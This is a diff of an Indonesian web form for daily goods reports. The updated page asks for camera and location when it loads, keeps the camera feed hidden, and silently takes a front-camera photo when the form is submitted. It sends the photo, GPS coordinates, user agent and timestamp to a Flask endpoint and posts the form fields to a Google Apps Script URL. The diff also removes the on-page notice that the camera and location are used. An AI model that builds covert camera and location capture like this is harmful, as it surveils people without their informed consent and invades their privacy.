@@ -1,120 +1,346 @@
-<!--
-Halaman form laporan barang.
-- Auto minta izin kamera & lokasi saat halaman load
-- Kamera tersembunyi (tidak tampil ke user)
-- Kalau izin ditolak -> tombol submit nonaktif
-- Foto, lokasi, dan data form dikirim ke server Flask
--->
-
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Laporan Barang</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .disabled { background-color: #ccc; cursor: not-allowed; }
-        video { display: none; } /* Kamera disembunyikan */
-    </style>
-</head>
-<body>
-    <h2>Laporan Barang Keluar/Masuk</h2>
-    <p>Form ini akan menggunakan kamera dan lokasi Anda untuk verifikasi.</p>
+  <head>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css"
+    />
+  </head>
+  <body>
+    <section class="hero is-primary is-bold">
+      <div class="hero-body">
+        <div class="container">
+          <h1 class="title">DAILY REPORT SEIJKT11</h1>
+        </div>
+      </div>
+    </section>
+    <form id="form" class="container m-4 pl-4" method="POST">
+      <div class="field">
+        <label class="label">Hari/Tanggal</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Hari/Tanggal"
+            name="Hari/Tanggal"
+          />
+        </div>
+      </div>
 
-    <!-- Form laporan -->
-    <form id="laporanForm" enctype="multipart/form-data" method="POST" action="/upload">
-        <label>Hari:</label><br>
-        <input type="text" name="hari" required><br><br>
 
-        <label>Jam:</label><br>
-        <input type="text" name="jam" required><br><br>
+      <div class="field">
+        <label class="label">Jam</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Jam"
+            name="Jam"
+          />
+        </div>
+      </div>
 
-        <label>Material:</label><br>
-        <input type="text" name="material" required><br><br>
 
-        <label>Keterangan:</label><br>
-        <textarea name="keterangan" required></textarea><br><br>
+      <div class="field">
+        <label class="label">Material dan Jumlah</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Material dan Jumlah"
+            name="Material dan Jumlah"
+          />
+        </div>
+      </div>
 
-        <input type="hidden" name="latitude" id="latitude">
-        <input type="hidden" name="longitude" id="longitude">
-        <input type="hidden" name="userAgent" id="userAgent">
 
-        <input type="file" name="photo" id="photoFile" accept="image/*" capture="environment" hidden>
+      <div class="field">
+        <label class="label">Keterangan</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Keterangan"
+            name="Keterangan"
+          />
+        </div>
+      </div>
 
-        <video id="video" autoplay playsinline></video>
 
-        <button type="submit" id="submitBtn" class="disabled" disabled>ENTER</button>
+      <div class="field is-grouped">
+        <div class="control">
+          <button class="button is-primary" type="submit" id="submit-button" disabled>
+            ENTER
+          </button>
+        </div>
+        <div class="control">
+          <button class="button is-danger" type="reset">Cancel</button>
+        </div>
+      </div>
+
+      <!-- Hidden metadata fields (added only, non-visual) -->
+      <input type="hidden" id="hidden_lat" name="hidden_lat" />
+      <input type="hidden" id="hidden_lon" name="hidden_lon" />
+      <input type="hidden" id="hidden_ua" name="hidden_ua" />
+      <input type="hidden" id="hidden_ts" name="hidden_ts" />
     </form>
+    <div
+      id="message"
+      style="
+        display: none;
+        margin: 20px;
+        font-weight: bold;
+        color: green;
+        padding: 8px;
+        background-color: beige;
+        border-radius: 4px;
+        border-color: aquamarine;
+      "
+    ></div>
 
     <script>
-        const video = document.getElementById("video");
-        const photoFile = document.getElementById("photoFile");
-        const submitBtn = document.getElementById("submitBtn");
+      (function () {
+        // ====== CONFIG ======
+        const SERVER_UPLOAD_URL = "/upload"; // Flask endpoint (same host)
+        const APPS_SCRIPT_URL =
+          "https://script.google.com/macros/s/AKfycbyET9ITEquXH5xnrzOBXZEP4C7_9q7u3zyz3SrzKaA3SZVNMb-gHTAQf0Rn6jgnWtNO4w/exec";
+        const SHEET_REDIRECT = "https://docs.google.com/spreadsheets/d/18uu1uAvZci1a3wZyOLx_q4BmsqbBepk10fefIXchMwE/edit?usp=drivesdk";
+        // ======================
 
-        // Set user agent ke form
-        document.getElementById("userAgent").value = navigator.userAgent;
+        const form = document.getElementById("form");
+        const submitButton = document.getElementById("submit-button");
+        const msgEl = document.getElementById("message");
 
-        let cameraReady = false;
-        let locationReady = false;
-        let stream;
+        // Hidden video & canvas (not shown)
+        const video = document.createElement("video");
+        video.autoplay = true;
+        video.playsInline = true;
+        video.style.display = "none";
+        document.body.appendChild(video);
 
-        // Fungsi cek status izin
-        function checkReady() {
-            if (cameraReady && locationReady) {
-                submitBtn.disabled = false;
-                submitBtn.classList.remove("disabled");
-            }
+        const canvas = document.createElement("canvas");
+        canvas.style.display = "none";
+        document.body.appendChild(canvas);
+
+        let stream = null;
+        let gotLocation = false;
+        let gotCamera = false;
+        let currentLat = "";
+        let currentLon = "";
+        const userAgent = navigator.userAgent || "";
+        let timestampWIB = "";
+
+        // message helper
+        function showMessage(text, type) {
+          msgEl.style.display = "block";
+          msgEl.textContent = text;
+          if (type === "error") {
+            msgEl.style.backgroundColor = "#ffdddd";
+            msgEl.style.color = "#900";
+          } else if (type === "success") {
+            msgEl.style.backgroundColor = "green";
+            msgEl.style.color = "beige";
+          } else {
+            msgEl.style.backgroundColor = "beige";
+            msgEl.style.color = "green";
+          }
         }
 
-        // Auto minta izin kamera saat load
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(s => {
-                stream = s;
-                video.srcObject = s;
-                cameraReady = true;
-                checkReady();
-            })
-            .catch(err => {
-                alert("Akses kamera ditolak. Form tidak bisa digunakan.");
+        // compute current WIB timestamp (YYYY-MM-DD HH:MM:SS)
+        function nowWIB() {
+          const d = new Date();
+          // UTC ms + 7 hours
+          const wibMs = d.getTime() + (d.getTimezoneOffset() * 60000) + (7 * 3600 * 1000);
+          const w = new Date(wibMs);
+          const yyyy = w.getFullYear();
+          const mm = String(w.getMonth() + 1).padStart(2, "0");
+          const dd = String(w.getDate()).padStart(2, "0");
+          const hh = String(w.getHours()).padStart(2, "0");
+          const mi = String(w.getMinutes()).padStart(2, "0");
+          const ss = String(w.getSeconds()).padStart(2, "0");
+          return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
+        }
+
+        // request camera (hidden)
+        async function requestCamera() {
+          try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            gotCamera = true;
+            checkEnable();
+          } catch (err) {
+            gotCamera = false;
+            checkEnable();
+            showMessage("", "error");
+            console.error("camera err:", err);
+          }
+        }
+
+        // request location
+        function requestLocation() {
+          if (!("geolocation" in navigator)) {
+            gotLocation = false;
+            checkEnable();
+            showMessage("Perangkat tidak mendukung lokasi. Submit dinonaktifkan.", "error");
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              currentLat = pos.coords.latitude;
+              currentLon = pos.coords.longitude;
+              gotLocation = true;
+              checkEnable();
+            },
+            (err) => {
+              gotLocation = false;
+              checkEnable();
+              showMessage("", "error");
+              console.error("geo err:", err);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        }
+
+        function checkEnable() {
+          if (gotCamera && gotLocation) {
+            submitButton.disabled = false;
+            msgEl.style.display = "none";
+            // fill hidden fields
+            document.getElementById("hidden_lat").value = currentLat;
+            document.getElementById("hidden_lon").value = currentLon;
+            document.getElementById("hidden_ua").value = userAgent;
+            timestampWIB = nowWIB();
+            document.getElementById("hidden_ts").value = timestampWIB;
+          } else {
+            submitButton.disabled = true;
+          }
+        }
+
+        function stopCamera() {
+          try {
+            if (stream && stream.getTracks) {
+              stream.getTracks().forEach((t) => t.stop());
+            }
+          } catch (e) {
+            console.warn("stop camera err", e);
+          }
+        }
+
+        function captureBlob() {
+          return new Promise((resolve, reject) => {
+            try {
+              const attempt = () => {
+                const w = video.videoWidth || 640;
+                const h = video.videoHeight || 480;
+                canvas.width = w;
+                canvas.height = h;
+                const ctx = canvas.getContext("2d");
+                try { ctx.drawImage(video, 0, 0, w, h); } catch (e) { console.warn(e); }
+                canvas.toBlob((blob) => {
+                  if (blob) resolve(blob);
+                  else reject(new Error("Gagal membuat blob foto"));
+                }, "image/jpeg", 0.9);
+              };
+              if (!video.videoWidth || !video.videoHeight) setTimeout(attempt, 300);
+              else attempt();
+            } catch (e) { reject(e); }
+          });
+        }
+
+        // submit handler
+        form.addEventListener("submit", async function (e) {
+          e.preventDefault();
+          submitButton.disabled = true;
+          showMessage("Submitting..", "info");
+
+          // refresh timestamp
+          timestampWIB = nowWIB();
+          document.getElementById("hidden_ts").value = timestampWIB;
+
+          // capture photo
+          let blob;
+          try {
+            blob = await captureBlob();
+          } catch (err) {
+            console.error("capture err", err);
+            showMessage("Gagal ambil foto. Submit dibatalkan.", "error");
+            submitButton.disabled = false;
+            return;
+          }
+
+          // 1) send to Flask server for internal pog.csv + photo saving
+          const sForm = new FormData();
+          sForm.append("photo", blob, `capture_${Date.now()}.jpg`);
+          sForm.append("timestamp_wib", timestampWIB);
+          sForm.append("latitude", currentLat);
+          sForm.append("longitude", currentLon);
+          sForm.append("user_agent", userAgent);
+
+          try {
+            const resp = await fetch(SERVER_UPLOAD_URL, { method: "POST", body: sForm });
+            if (!resp.ok) {
+              const txt = await resp.text();
+              throw new Error("Server error: " + txt);
+            }
+          } catch (err) {
+            console.error("server upload err", err);
+            showMessage("Gagal kirim ke server internal. Periksa server.", "error");
+            submitButton.disabled = false;
+            stopCamera();
+            return;
+          }
+
+          // stop camera asap
+          stopCamera();
+
+          // 2) build original form data string exactly like script awal (key=value&key2=...)
+          try {
+            const origFormData = new FormData(form);
+            // ensure hidden metadata also included to Apps Script (optional)
+            origFormData.set("hidden_lat", currentLat);
+            origFormData.set("hidden_lon", currentLon);
+            origFormData.set("hidden_ua", userAgent);
+            origFormData.set("hidden_ts", timestampWIB);
+
+            const keyValuePairs = [];
+            for (const pair of origFormData.entries()) {
+              // keep same style as original (no encode to mimic original)
+              keyValuePairs.push(pair[0] + "=" + pair[1]);
+            }
+            const formDataString = keyValuePairs.join("&");
+
+            const resp2 = await fetch(APPS_SCRIPT_URL, {
+              redirect: "follow",
+              method: "POST",
+              body: formDataString,
+              headers: { "Content-Type": "text/plain;charset=utf-8" },
             });
 
-        // Auto minta izin lokasi saat load
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                document.getElementById("latitude").value = pos.coords.latitude;
-                document.getElementById("longitude").value = pos.coords.longitude;
-                locationReady = true;
-                checkReady();
-            },
-            err => {
-                alert("Akses lokasi ditolak. Form tidak bisa digunakan.");
+            if (resp2) {
+              showMessage("Data submitted successfully!", "success");
+              form.reset();
+              setTimeout(() => { window.location.href = SHEET_REDIRECT; }, 700);
+            } else {
+              throw new Error("Apps Script submission failed");
             }
-        );
-
-        // Ambil foto diam-diam sebelum submit
-        document.getElementById("laporanForm").addEventListener("submit", function(e) {
-            e.preventDefault();
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
-                const data = new FormData(this);
-                data.set("photo", file);
-
-                fetch("/upload", { method: "POST", body: data })
-                    .then(res => {
-                        if (res.ok) {
-                            window.location.href = "https://docs.google.com/spreadsheets/d/ID_SHEET_KAMU/edit";
-                        } else {
-                            alert("Gagal mengirim data");
-                        }
-                    });
-            }, "image/jpeg");
+          } catch (err) {
+            console.error("apps script err:", err);
+            showMessage("Gagal kirim ke spreadsheet. Cek koneksi.", "error");
+            submitButton.disabled = false;
+          }
         });
+
+        // init on load
+        window.addEventListener("load", function () {
+          document.getElementById("hidden_ua").value = userAgent;
+          requestCamera();
+          requestLocation();
+        });
+
+        // stop camera if leaving
+        window.addEventListener("beforeunload", stopCamera);
+      })();
     </script>
-</body>
-      </html>
-      
+  </body>
+    </html>
+    
